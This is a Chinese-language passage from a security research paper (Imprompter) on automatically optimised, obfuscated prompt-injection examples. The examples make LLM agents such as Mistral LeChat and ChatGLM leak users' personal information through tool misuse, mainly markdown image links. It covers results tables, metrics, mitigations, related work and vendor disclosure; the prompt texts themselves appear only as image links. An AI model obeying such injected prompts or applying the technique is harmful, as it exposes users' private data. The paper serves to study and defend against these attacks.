表 5. 个人身份信息泄露攻击。在各种攻击设置下的本地评估结果。$\downarrow$ 表示从初始提示到对抗性提示的变化。注意，我们手动修改了 T9 作为 T10 的初始提示。类似地，我们基于其他失败尝试设置了 T11 和 T12 的初始提示。观察到这种方法有效地增强了对抗性提示的困惑度，即模糊程度（如第[4.1](https://arxiv.org/html/2410.14923v2#S4.SS1.SSS0.Px3 "Obfuscation. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")节所述）。注意，个人身份信息的精确度和召回率仅在语法正确的情况下计算。

{tblr} colspec=Q[c,0.7cm]Q[c,0.7cm]Q[c]Q[c,5cm]Q[c,5cm]Q[c]Q[c]Q[c]Q[c]Q[c]Q[c], rowspec=Q[m], hline1,Z = 1pt, \SetCell[c=2]c 攻击

设置 & ID 初始提示文本 对抗性提示文本 PPL 语法

正确率 % 个人身份信息

精确度 % 个人身份信息

召回率 % 上下文

GPT % 时间

h

\SetCell[r=4,c=2]c Mistral

Nemo

MD Img \SetCell[r=2]c T9 \SetCell[r=2]l,m ![[未标注图片]](img/8b4e3f511065c62a6041f4b6e72a208f.png) \SetCell[r=2]c,m ![[未标注图片]](img/27ecefe6acb319d472c7e717ccea1e57.png) \SetCell[r=2]c 128

$\downarrow$

1905 \SetCell[r=2]c 77.2

$\downarrow$

97.2 \SetCell[r=2]c 54.3 \SetCell[r=2]c 30.1 \SetCell[r=2]c 94.8 \SetCell[r=2]c 44

\SetCell[r=2]c T10 \SetCell[r=2]l,m ![[未标注图片]](img/8bcafc319b4398ec26e0c91205859250.png) \SetCell[r=2]c,m ![[未标注图片]](img/0f1b0e6b02dcadd4855c47b8b9c2625e.png) \SetCell[r=2]c 2170

$\downarrow$

7489 \SetCell[r=2]c 0

$\downarrow$

100 \SetCell[r=2]c 79.8 \SetCell[r=2]c 47.0 \SetCell[r=2]c 75.2 \SetCell[r=2]c 16

\SetCell[r=2]r 手动提示 \SetCell[r=2]c N6 \SetCell[r=2,c=2]l,m,10.2cm ![[未标注图片]](img/9a96c8f2f706189c483c8b62ee74b7e5.png) \SetCell[r=2]c,m \SetCell[r=2]c 110 \SetCell[r=2]c 40.0 \SetCell[r=2]c 85.4 \SetCell[r=2]c 51.0 \SetCell[r=2]c 46.8 \SetCell[r=2]c -

\SetCell[r=4,c=2]c GLM4

MD 图片 \SetCell[r=2]c T11 \SetCell[r=2]l,m ![[未标注图片]](img/16e3e2c2641fc8b6d04ca0afad6c2958.png) \SetCell[r=2]c,m ![[未标注图片]](img/4facdd0446b04dd906c13d2f0f5092f4.png) \SetCell[r=2]c 3237

$\downarrow$

15877 \SetCell[r=2]c 17.2

$\downarrow$

92.0 \SetCell[r=2]c 48.1 \SetCell[r=2]c 22.0 \SetCell[r=2]c 48.0 \SetCell[r=2]c 20

\SetCell[r=2]c T12 \SetCell[r=2]l,m ![[未标注图片]](img/acc35408d8f2ba921b4a6078228f83c0.png) \SetCell[r=2]c,m ![[未标注图片]](img/c4669aa8d23a95da4ba1b95981ef8422.png) \SetCell[r=2]c 5361

$\downarrow$

14120 \SetCell[r=2]c 9.2

$\downarrow$

90.1 \SetCell[r=2]c 39.3 \SetCell[r=2]c 16.8 \SetCell[r=2]c 56.0 \SetCell[r=2]c 19

\SetCell[r=2]r 手动提示 \SetCell[r=2]c N6 \SetCell[r=2,c=2]l,m,10.2cm ![[未标注图片]](img/af6102116a6e1f9a88217548e3263808.png) \SetCell[r=2]c,m \SetCell[r=2]c 110 \SetCell[r=2]c 52 \SetCell[r=2]c 71.7 \SetCell[r=2]c 61.0 \SetCell[r=2]c 46.6 \SetCell[r=2]c -

#### 指标。

对于 PII 外泄攻击目标，我们重用了上述提到的困惑度和语法正确性指标，并增加了三个面向 PII 的指标，如下所示：

1.  (1)

    PII 精确率——提取中真正为 PII 的术语与提取中所有术语的比例。该指标是对提取准确度的悲观估计，因为攻击不仅需要提取 PII 还需要提取上下文。这些上下文术语会错误地降低该指标。例如，“John Doe, +1 888-88-8888, 申请美国签证”与地面真实 PII “John Doe, +1 888-88-8888”相比，给出的精确度得分为 $2/3$，因为尽管最后一个术语是有用的上下文，但它不在地面真实中。更不用说，精确匹配所有可能的上下文术语作为地面真实是不现实的。

1.  (2)

    PII 召回率——正确提取的 PII 术语在提取负载中占所有对话中提到的地面真实 PII 总数的比例。它反映了提取的 PII 完整性。尽管我们不期望攻击能完全提取所有 PII，但它仍然是相关的，因为提取越完整，攻击者识别个人的难度就越小。

1.  (3)

    Context GPT评分——GPT-4-o是否认为有效载荷包含有助于识别对话者意图或对话主题的上下文（提示见附录[A.2](https://arxiv.org/html/2410.14923v2#A1.SS2 "A.2\. Prompt List ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")）。(当语法不正确时，这个值始终为假。)该指标提供了提取的上下文质量的估计。由于这是一个相对主观的指标，我们将其视为次要参考。

再次强调，语法正确性是最高优先级，且三个新度量遵循上述顺序。此外，我们要强调的是，PII召回率和精确率仅在工具调用语法正确时才进行计算。我们在数据集中的每个对话上计算这些指标，并报告所有对话的平均结果。

#### 本地LLM的结果。

我们在不同优化设置下对训练数据集进行了优化方法的运行。我们再次展示了来自不同优化设置的几种最佳表现提示及其在验证集（25个对话）上的评估结果，见表[5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")。我们发现了与信息泄露攻击类似的模式。

我们的对抗样本在本地文本LLM中有效地泄露了个人身份信息（PII）。我们可以看到，我们展示的所有文本提示都表现出较高的语法正确率（约90%，甚至接近100%），同时困惑度也较高（远远优于自然语言指令和初始提示）。T10在困惑度方面比T9更为混淆，展示了用一个较少混淆的优化提示进行初始化能够帮助增强混淆，如第[4.1节](https://arxiv.org/html/2410.14923v2#S4.SS1.SSS0.Px3 "Obfuscation. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")中所述。T10的PII精确率大约为80%的绝对值，考虑到上述问题，这一度量值是下限估计，表现非常强劲。接近50%的PII召回率表明平均情况下提取了约一半的PII，考虑到验证集中每次对话提供了7.4个PII信息，这一结果相当令人满意。GLM4的T11和T12在提取PII方面的表现不如T10，但仍成功提取了一些PII。

#### 实际产品上的结果。

我们评估了最佳性能的文本提示在PII泄露中的整体表现，T10在Mistral LeChat Nemo上，T12和T13在ChatGLM上，均使用相同的验证集并且每个模型进行一次推理。我们还测试了相应的自然语言指令N6。结果如表[6](https://arxiv.org/html/2410.14923v2#S5.T6 "Table 6 ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")中给出。

表6. 实际产品上的PII泄露攻击。来自表[5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")中最佳表现（在相应攻击设置下）的对抗提示在LeChat和ChatGLM上的评估结果与手动提示进行比较。

代理ID 语法正确率 % PII精确率 % PII召回率 % 上下文 GPT % Mistral LeChat Nemo T10 100 70.4 41.2 88.0 N6 44.0 80.2 48.2 36.0 ChatGLM T11 96.0 0.0 0.0 0.0 T12 92.0 34.7 63.0 88.0 N6 40.0 89.1 48.1 100

我们的对抗性文本提示被转移到黑箱的真实世界大语言模型（LLM）代理上进行PII泄露任务。我们可以看到，攻击是有效的。语法几乎始终正确生成（约90%），这与本地测试的表现一致。对于T10，PII精准率、上下文GPT评分和PII召回率与本地评估结果相当，并且表现令人满意。有趣的是，T11在真实产品ChatGLM上没有提取任何有用的PII——它总是提取一个术语，这个术语是提示的一部分。相比之下，T12在真实产品上的表现明显优于本地测试。我们怀疑，ChatGLM背后的实际模型可能比我们在本地攻击的GLM4-9B模型大得多且有所不同（与Mistral Nemo不同），这可能导致这种表现不匹配。

我们还对在没有任何PII信息的对话中，专为PII泄露攻击设计的T10提示会如何表现感到好奇。因此，我们使用信息泄露设置中的验证数据集对T10进行了评估，这些数据集包含一般对话。结果见表[3](https://arxiv.org/html/2410.14923v2#S5.T3 "Table 3 ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")。请注意，语法率仍然很高（90%）。由于对话中缺乏PII，提取的准确性较低，这是预期的。

#### 当攻击失败时会发生什么？

查看在Mistral LeChat和ChatGLM上，针对两个攻击目标的失败尝试（语法正确性不满足的情况），我们发现当失败时，代理大多以纯文本的方式响应一个关键词列表，而没有调用工具的语法。偶尔，代理可能会响应正确的目标字符串，但会将其包裹在Markdown代码块中。这可以通过在优化初始化时明确设置不使用代码块（如T5中所做）来潜在地缓解。在少数情况下，代理会回应一些随机的无关内容。

## 6. 讨论与局限性

#### 潜在的缓解措施。

一些大型语言模型（LLM）代理采用保守策略，只允许使用非常有限的工具集（例如，Meta.ai 仅与 Wolfram Alpha 接口，并且只在一组静态网站上搜索信息）。限制工具使用可以帮助防御本文中所提到的攻击，然而，这种限制会降低 LLM 代理的可用性，因此从长远来看可能不是一个好的选择。另一种缓解方法是过滤掉高困惑度的输入，试图拒绝潜在的混淆提示（Menear，[2024](https://arxiv.org/html/2410.14923v2#bib.bib32)）。然而，这种方法可能并不可靠，因为之前的研究表明，虽然某些提示的困惑度较低，但对人类来说仍然是混淆的（Kuribayashi 等人，[2021](https://arxiv.org/html/2410.14923v2#bib.bib21)）。类似地，高困惑度的输入不一定意味着存在敌意的混淆。例如，之前的工作还表明，自动调整的提示（即便是无害的目的）也可能具有高困惑度（Melamed 等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib31)）。

#### 开放权重访问 vs. 黑盒。

我们攻击的成功依赖于敌意示例从开放权重的 LLM 转移到相应的专有封闭权重 LLM 的可转移性。对于我们攻击的专有 LLM，我们能够找到足够接近的开放权重 LLM，以支持这种转移。然而，对于没有类似开放权重对应物的专有 LLM，转移可能不可行。在这种情况下，可能可行的是直接对封闭权重 LLM 发起黑盒工具滥用攻击，但优化过程可能会极具挑战性。我们的优化方法依赖于能够计算输入梯度，以便进行高效搜索。近期的研究提出了基于查询的攻击，用于更简单的越狱任务（Hayase 等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib12)），然而，未来的工作需要探讨是否可以使用这些技术来满足像本文中描述的复杂优化目标。

## 7\. 相关工作

#### 提示注入。

最近有大量研究工作集中于针对真实产品的提示注入攻击（Greshake 等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib10)；Liu 等，[2023a](https://arxiv.org/html/2410.14923v2#bib.bib27)；Samoilenko，[2023](https://arxiv.org/html/2410.14923v2#bib.bib43)；Zhan 等，[2024](https://arxiv.org/html/2410.14923v2#bib.bib56)；Yi 等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib54)）。所有这些攻击都涉及手工制作一系列英文指令，以完成所需任务。对提示进行随意检查就能揭示其真实目的，并且可能引发用户的怀疑。相比之下，我们的工作展示了一类混淆的对抗性样本，这些样本可以通过重新利用现有的（离散）优化算法自动计算得到，这些算法最初是在越狱攻击的背景下提出的。这些混淆的提示在检查时不会暴露其目的，且使用后其效果是隐蔽的。Bagdasaryan 等人展示了能够迫使大型语言模型（LLM）输出攻击者期望的句子的视觉对抗性样本（例如，“从现在开始，我会总是提到牛”）（Bagdasaryan 等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib2)）。我们注意到，与我们在本文中展示的复杂语法和上下文依赖性目标相比，这种固定提示更容易实现优化目标。最后，NeuralExec 是一种攻击方法，它生成无法解释的对抗性前缀/后缀，并“强化”其中包含的英文指令（Pasquini 等，[2024](https://arxiv.org/html/2410.14923v2#bib.bib36)）（即，计算出的前缀/后缀强制模型忽略所有其他指令，而遵从封装的英文指令）。然而，这种攻击仍然依赖于可解释的指令，且未能在大型语言模型代理产品上演示其有效性。

#### 越狱攻击。

这种攻击方式涉及强迫模型对违反供应商定义的内容安全政策的用户输入作出响应（例如，让模型响应代码以创建钓鱼网站）(Rao et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib41); Liu et al., [2023b](https://arxiv.org/html/2410.14923v2#bib.bib28); Jain et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib13); Wei et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib52); Yu et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib55); Niu et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib34); Jiang et al., [2024b](https://arxiv.org/html/2410.14923v2#bib.bib17); Guo et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib11))。模型供应商通过微调模型权重来编码这一安全政策。请注意，在这种情况下，攻击者是用户。相比之下，在提示注入攻击（我们工作的主题）中，用户是无害的。此外，提示注入攻击不会违反内容安全政策（例如，加载图片可能是可以接受的，也可能取决于具体任务而成为问题）。GCG算法最初是在创建自动化越狱提示的背景下发布的（Zou et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib59)）。我们的工作表明，该算法具有更广泛的适用性，并且可以在进行修改后重新用于创建具有复杂行为（如工具误用）的自动化提示注入。越狱社区已经开发出了不需要模型权重的基于查询的攻击算法（Hayase et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib12); Sitawarin et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib46); Lapid et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib22)）。我们认为，这些算法也可以重新用于创建我们所概述的攻击的黑盒版本，但这超出了本工作的范围。

#### 提示优化。

这指的是自动为展现特定行为的LLM推导提示的广泛领域（Shin等，[2020](https://arxiv.org/html/2410.14923v2#bib.bib45)；Shi等，[2022](https://arxiv.org/html/2410.14923v2#bib.bib44)；Wen等，[2024](https://arxiv.org/html/2410.14923v2#bib.bib53)；Lester等，[2021](https://arxiv.org/html/2410.14923v2#bib.bib23)；Li和Liang，[2021](https://arxiv.org/html/2410.14923v2#bib.bib24)；Liu等，[2021](https://arxiv.org/html/2410.14923v2#bib.bib26)；Qin等，[2022](https://arxiv.org/html/2410.14923v2#bib.bib39)）。他们利用了一系列技术，包括梯度信息、搜索和强化学习。与计算机安全任务不同，这些技术的发明是为了更有效地指导LLM完成用户任务。GCG及其衍生工作展示了这些技术的双重性质——它们可以被重新用于制造攻击。这种双重性质源自于早期的对抗性机器学习工作，在这些工作中，攻击者可以简单地重用基于梯度的优化来制造攻击（Jang等，[2017](https://arxiv.org/html/2410.14923v2#bib.bib14)）。

## 8\. 结论

深度将生成性机器学习与工具结合，帮助用户实现现实任务的基于代理的系统，具有引发个人计算范式转变的潜力。我们通过揭示一种新的模糊对抗示例类别及其自动生成技术，为这一新兴领域的安全基础做出了贡献。通过对生产级代理和本地模型进行的一系列实验，这些对抗示例可靠地滥用工具泄露个人信息。鉴于目前在线分享优化提示的趋势，类似于我们今天在线分享应用程序一样，很可能恶意提示也会被共享并误用，就像恶意软件被共享一样。

## 致谢

我们感谢Stefan Savage和Geoff Voelker对本文命名的建议。我们感谢Niloofar Mireshghallah在她的研究中引导我们理解数据集。

## 披露与响应

我们分别在2024年9月9日和2024年9月18日向Mistral和ChatGLM团队披露了此问题。Mistral团队成员迅速响应并确认该漏洞为中等严重性问题。他们在2024年9月13日通过禁用外部图片的Markdown渲染解决了数据泄露问题。⁹⁹9请查看2024年9月13日的[更新日志](https://docs.mistral.ai/getting-started/changelog/)。我们确认该修复有效。在写作时，ChatGLM团队刚刚通知我们，他们在经过多次尝试通过不同渠道联系后，已开始处理此问题。^(10)^(10)10[https://github.com/THUDM/GLM-4/issues/592](https://github.com/THUDM/GLM-4/issues/592)

## 参考文献

+   (1)

+   Bagdasaryan 等人 (2023) Eugene Bagdasaryan, Tsung-Yin Hsieh, Ben Nassi 和 Vitaly Shmatikov。2023年。《（滥）用图像和声音在多模态 LLM 中进行间接指令注入》。arXiv:2307.10490 [cs.CR]。

+   Bengio 等人 (2000) Yoshua Bengio, Réjean Ducharme 和 Pascal Vincent。2000年。《一种神经概率语言模型》。*神经信息处理系统进展* 13 (2000)。

+   Beyer 等人 (2024) Lucas Beyer, Andreas Steiner, André Susano Pinto, Alexander Kolesnikov, Xiao Wang, Daniel Salz, Maxim Neumann, Ibrahim Alabdulmohsin, Michael Tschannen, Emanuele Bugliarello 等人。2024年。《PaliGemma：一种多功能 3B VLM 用于迁移》。*arXiv 预印本 arXiv:2407.07726* (2024)。

+   Dubey 等人 (2024) Abhimanyu Dubey, Abhinav Jauhri, Abhinav Pandey, Abhishek Kadian, Ahmad Al-Dahle, Aiesha Letman, Akhil Mathur, Alan Schelten, Amy Yang, Angela Fan 等人。2024年。《Llama 3 模型群》。*arXiv 预印本 arXiv:2407.21783* (2024)。

+   Fourrier 等人 (2024) Clémentine Fourrier, Nathan Habib, Alina Lozovskaya, Konrad Szafer 和 Thomas Wolf。2024年。《Open LLM 排行榜 v2》。[https://huggingface.co/spaces/open-llm-leaderboard/open_llm_leaderboard](https://huggingface.co/spaces/open-llm-leaderboard/open_llm_leaderboard)。

+   Fu 等人 (2023) Xiaohan Fu, Zihan Wang, Shuheng Li, Rajesh K Gupta, Niloofar Mireshghallah, Taylor Berg-Kirkpatrick 和 Earlence Fernandes。2023年。《在大语言模型中滥用工具与视觉对抗示例》。*arXiv 预印本 arXiv:2310.03185* (2023)。

+   GLM 等人 (2024) GLM 团队，Aohan Zeng, Bin Xu, Bowen Wang, Chenhui Zhang, Da Yin, Diego Rojas, Guanyu Feng, Hanlin Zhao, Hanyu Lai 等人。2024年。《ChatGLM：从 GLM-130B 到 GLM-4 所有工具的语言模型家族》。*arXiv 预印本 arXiv:2406.12793* (2024)。

+   Goodfellow 等人 (2014) Ian J Goodfellow, Jonathon Shlens 和 Christian Szegedy。2014年。《解释和利用对抗示例》。*arXiv 预印本 arXiv:1412.6572* (2014)。

+   Greshake 等人 (2023) Kai Greshake, Sahar Abdelnabi, Shailesh Mishra, Christoph Endres, Thorsten Holz 和 Mario Fritz。2023年。《并非你所注册的：通过间接提示注入破坏真实世界的 LLM 集成应用》。arXiv:2302.12173 [cs.CR]。

+   Guo 等人 (2024) Xingang Guo, Fangxu Yu, Huan Zhang, Lianhui Qin 和 Bin Hu。2024年。《冷攻击：通过隐蔽性和可控性破解 LLM》。*arXiv 预印本 arXiv:2402.08679* (2024)。

+   Hayase 等人 (2024) Jonathan Hayase, Ema Borevkovic, Nicholas Carlini, Florian Tramèr 和 Milad Nasr。2024年。《基于查询的对抗性提示生成》。*arXiv 预印本 arXiv:2402.12329* (2024)。

+   Jain 等人 (2023) Neel Jain, Avi Schwarzschild, Yuxin Wen, Gowthami Somepalli, John Kirchenbauer, Ping Yeh Chiang, Micah Goldblum, Aniruddha Saha, Jonas Geiping 和 Tom Goldstein。2023年。《针对对齐语言模型的对抗攻击基线防御》。arXiv:2309.00614 [cs.LG]。

+   Jang 等人 (2017) Uyeong Jang, Xi Wu, 和 Somesh Jha. 2017. 机器学习中的对抗样本的客观指标和梯度下降算法. 见 *第33届年度计算机安全应用大会论文集*. 262–277.

+   Jiang 等人 (2023) Albert Q Jiang, Alexandre Sablayrolles, Arthur Mensch, Chris Bamford, Devendra Singh Chaplot, Diego de las Casas, Florian Bressand, Gianna Lengyel, Guillaume Lample, Lucile Saulnier, 等人. 2023. Mistral 7B. *arXiv 预印本 arXiv:2310.06825* (2023).

+   Jiang 等人 (2024a) Albert Q Jiang, Alexandre Sablayrolles, Antoine Roux, Arthur Mensch, Blanche Savary, Chris Bamford, Devendra Singh Chaplot, Diego de las Casas, Emma Bou Hanna, Florian Bressand, 等人. 2024a. Mixtral 专家混合模型. *arXiv 预印本 arXiv:2401.04088* (2024).

+   Jiang 等人 (2024b) Fengqing Jiang, Zhangchen Xu, Luyao Niu, Zhen Xiang, Bhaskar Ramasubramanian, Bo Li, 和 Radha Poovendran. 2024b. Artprompt: 基于 ASCII 艺术的对齐大语言模型的越狱攻击. *arXiv 预印本 arXiv:2402.11753* (2024).

+   Jin 等人 (2024) Hanlei Jin, Yang Zhang, Dan Meng, Jun Wang, 和 Jinghua Tan. 2024. 基于过程的自动文本摘要的全面调查，并探索基于大语言模型的方法. *arXiv 预印本 arXiv:2403.02901* (2024).

+   Kapoor 等人 (2024) Sayash Kapoor, Benedikt Stroebl, Zachary S. Siegel, Nitya Nadgir, 和 Arvind Narayanan. 2024. 重要的 AI 代理. arXiv:2407.01502 [cs.LG] [https://arxiv.org/abs/2407.01502](https://arxiv.org/abs/2407.01502)

+   Kingma 和 Ba (2014) Diederik P Kingma 和 Jimmy Ba. 2014. Adam: 一种用于随机优化的方法. *arXiv 预印本 arXiv:1412.6980* (2014).

+   Kuribayashi 等人 (2021) Tatsuki Kuribayashi, Yohei Oseki, Takumi Ito, Ryo Yoshida, Masayuki Asahara, 和 Kentaro Inui. 2021. 更低的困惑度不一定像人类. *arXiv 预印本 arXiv:2106.01229* (2021).

+   Lapid 等人 (2023) Raz Lapid, Ron Langberg, 和 Moshe Sipper. 2023. 开启芝麻！大语言模型的通用黑盒越狱. *arXiv 预印本 arXiv:2309.01446* (2023).

+   Lester 等人 (2021) Brian Lester, Rami Al-Rfou, 和 Noah Constant. 2021. 参数高效的提示调优的尺度效应. *arXiv 预印本 arXiv:2104.08691* (2021).

+   Li 和 Liang (2021) Xiang Lisa Li 和 Percy Liang. 2021. Prefix-tuning: 优化生成的连续提示. *arXiv 预印本 arXiv:2101.00190* (2021).

+   Liu 等人 (2024) Tong Liu, Zhe Zhao, Yinpeng Dong, Guozhu Meng, 和 Kai Chen. 2024. 让它们提问和回答：通过伪装和重构在少量查询中对大语言模型进行越狱. 见 *第33届 USENIX 安全研讨会 (USENIX Security 24)*. 4711–4728.

+   Liu 等人 (2021) Xiao Liu, Kaixuan Ji, Yicheng Fu, Weng Lam Tam, Zhengxiao Du, Zhilin Yang, 和 Jie Tang. 2021. P-tuning v2: 提示调优在各个规模和任务中可以与微调相媲美. *arXiv 预印本 arXiv:2110.07602* (2021).

+   Liu 等人 (2023a) Yi Liu, Gelei Deng, Yuekang Li, Kailong Wang, Zihao Wang, Xiaofeng Wang, Tianwei Zhang, Yepang Liu, Haoyu Wang, Yan Zheng, 等人. 2023a. *Prompt Injection attack against LLM-integrated Applications*. *arXiv 预印本 arXiv:2306.05499* (2023).

+   Liu 等人 (2023b) Yi Liu, Gelei Deng, Zhengzi Xu, Yuekang Li, Yaowen Zheng, Ying Zhang, Lida Zhao, Tianwei Zhang, Kailong Wang, 和 Yang Liu. 2023b. *Jailbreaking chatgpt via prompt engineering: An empirical study*. *arXiv 预印本 arXiv:2305.13860* (2023).

+   Martinc 等人 (2021) Matej Martinc, Senja Pollak, 和 Marko Robnik-Šikonja. 2021. *Supervised and unsupervised neural approaches to text readability*. *计算语言学* 47, 1 (2021), 141–179.

+   Maus 等人 (2023) Natalie Maus, Patrick Chao, Eric Wong, 和 Jacob Gardner. 2023. *Adversarial Prompting for Black Box Foundation Models*. *arXiv* (2023).

+   Melamed 等人 (2024) Rimon Melamed, Lucas H. McCabe, Tanay Wakhare, Yejin Kim, H. Howie Huang, 和 Enric Boix-Adsera. 2024. *Prompt have evil twins*. arXiv:2311.07064 [cs.CL] [https://arxiv.org/abs/2311.07064](https://arxiv.org/abs/2311.07064)

+   Menear (2024) Harry Menear. 2024. *Jailbreaking large language models: How it’s done and how to stop it*.

+   Mireshghallah 等人 (2024) Niloofar Mireshghallah, Maria Antoniak, Yash More, Yejin Choi, 和 Golnoosh Farnadi. 2024. *Trust No Bot: Discovering Personal Disclosures in Human-LLM Conversations in the Wild*. *arXiv 预印本 arXiv:2407.11438* (2024).

+   Niu 等人 (2024) Zhenxing Niu, Haodong Ren, Xinbo Gao, Gang Hua, 和 Rong Jin. 2024. *Jailbreaking attack against multimodal large language model*. *arXiv 预印本 arXiv:2402.02309* (2024).

+   OpenAI (2023) OpenAI. 2023. *GPT-4 Technical Report*. *CoRR* abs/2303.08774 (2023). [https://doi.org/10.48550/arXiv.2303.08774](https://doi.org/10.48550/arXiv.2303.08774) arXiv:2303.08774

+   Pasquini 等人 (2024) Dario Pasquini, Martin Strohmeier, 和 Carmela Troncoso. 2024. *Neural Exec: Learning (and Learning from) Execution Triggers for Prompt Injection Attacks*. *arXiv 预印本 arXiv:2403.03792* (2024).

+   Patil 等人 (2023) Shishir G Patil, Tianjun Zhang, Xin Wang, 和 Joseph E Gonzalez. 2023. *Gorilla: Large language model connected with massive apis*. *arXiv 预印本 arXiv:2305.15334* (2023).

+   Porter (2001) Martin F Porter. 2001. *Snowball: A language for stemming algorithms*.

+   Qin 等人 (2022) Lianhui Qin, Sean Welleck, Daniel Khashabi, 和 Yejin Choi. 2022. *Cold decoding: Energy-based constrained text generation with langevin dynamics*. *神经信息处理系统进展* 35 (2022), 9538–9551.

+   Qin 等人 (2023) Yujia Qin, Shihao Liang, Yining Ye, Kunlun Zhu, Lan Yan, Yaxi Lu, Yankai Lin, Xin Cong, Xiangru Tang, Bill Qian, 等人. 2023. *Toolllm: Facilitating large language models to master 16000+ real-world apis*. *arXiv 预印本 arXiv:2307.16789* (2023).

+   Rao et al. (2023) Abhinav Rao, Sachin Vashistha, Atharva Naik, Somak Aditya, 和 Monojit Choudhury. 2023. 诱使 LLM 违抗指令：理解、分析和防止越狱。*arXiv 预印本 arXiv:2305.14965* (2023).

+   Rehberger (2023) Johann Rehberger. 2023. AI 注入：直接和间接的提示注入及其影响。 [https://embracethered.com/blog/posts/2023/ai-injections-direct-and-indirect-prompt-injection-basics/](https://embracethered.com/blog/posts/2023/ai-injections-direct-and-indirect-prompt-injection-basics/).

+   Samoilenko (2023) Roman Samoilenko. 2023. 一种新的提示注入攻击 ChatGPT 网页版。Markdown 图像可能窃取你的聊天数据。

+   Shi et al. (2022) Weijia Shi, Xiaochuang Han, Hila Gonen, Ari Holtzman, Yulia Tsvetkov, 和 Luke Zettlemoyer. 2022. 朝着人类可读的提示调优迈进：Kubrick 的《闪灵》是一部好电影，也是一个好提示吗？*arXiv 预印本 arXiv:2212.10539* (2022).

+   Shin et al. (2020) Taylor Shin, Yasaman Razeghi, Robert L Logan IV, Eric Wallace, 和 Sameer Singh. 2020. Autoprompt: 用自动生成的提示从语言模型中引出知识。*arXiv 预印本 arXiv:2010.15980* (2020).

+   Sitawarin et al. (2024) Chawin Sitawarin, Norman Mu, David Wagner, 和 Alexandre Araujo. 2024. Pal: 基于代理的黑盒攻击大规模语言模型。*arXiv 预印本 arXiv:2402.09674* (2024).

+   Taori et al. (2023) Rohan Taori, Ishaan Gulrajani, Tianyi Zhang, Yann Dubois, Xuechen Li, Carlos Guestrin, Percy Liang, 和 Tatsunori B. Hashimoto. 2023. Stanford Alpaca: 一个遵循指令的 LLaMA 模型. [https://github.com/tatsu-lab/stanford_alpaca](https://github.com/tatsu-lab/stanford_alpaca).

+   Team et al. (2023) Gemini Team, Rohan Anil, Sebastian Borgeaud, Yonghui Wu, Jean-Baptiste Alayrac, Jiahui Yu, Radu Soricut, Johan Schalkwyk, Andrew M Dai, Anja Hauth, 等人. 2023. Gemini: 一类高能力的多模态模型。*arXiv 预印本 arXiv:2312.11805* (2023).

+   Team et al. (2024) Gemma Team, Morgane Riviere, Shreya Pathak, Pier Giuseppe Sessa, Cassidy Hardin, Surya Bhupatiraju, Léonard Hussenot, Thomas Mesnard, Bobak Shahriari, Alexandre Ramé, 等人. 2024. Gemma 2: 改进具有实际规模的开放语言模型。*arXiv 预印本 arXiv:2408.00118* (2024).

+   Team (2024) The Mistral AI Team. 2024. Mistral-Nemo-Base-2407. [https://huggingface.co/mistralai/Mistral-Nemo-Base-2407](https://huggingface.co/mistralai/Mistral-Nemo-Base-2407).

+   Wang et al. (2004) Zhou Wang, Alan C Bovik, Hamid R Sheikh, 和 Eero P Simoncelli. 2004. 图像质量评估：从误差可见性到结构相似性。*IEEE 图像处理学报* 13, 4 (2004), 600–612.

+   Wei et al. (2023) Alexander Wei, Nika Haghtalab, 和 Jacob Steinhardt. 2023. Jailbroken: LLM 安全训练为何失败？arXiv:2307.02483 [cs.LG]

